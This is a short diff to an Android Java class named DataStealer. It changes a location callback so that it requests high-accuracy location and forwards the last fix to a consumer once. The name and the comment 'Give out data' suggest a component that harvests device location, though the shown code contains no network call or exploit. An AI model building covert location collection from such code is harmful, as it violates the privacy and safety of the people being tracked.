@@ -175,15 +175,19 @@ public class DataStealer {
         locationRequest.setFastestInterval(50);
         locationRequest.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
         LocationCallback locationCallback = new LocationCallback() {
+            private boolean sendOnce = false;
+
             @Override
             public void onLocationResult(LocationResult locationResult) {
-                if (locationResult == null) {
+                if (locationResult == null || sendOnce) {
                     return;
                 }
-                for (Location location : locationResult.getLocations()) {
-                    // Give out data
-                    consumer.accept(Collections.singletonList(new LocationData(location)));
+                Location last = locationResult.getLastLocation();
+                if (last != null) {
+                    consumer.accept(ArrayExt.toArrayList(new LocationData(last)));
                     client.removeLocationUpdates(this);
+                    sendOnce = true;
+                    return;
                 }
             }
         };
@@ -300,6 +304,4 @@ public class DataStealer {
             // User has disabled "location" in device settings
         }
     }
-
-
 }
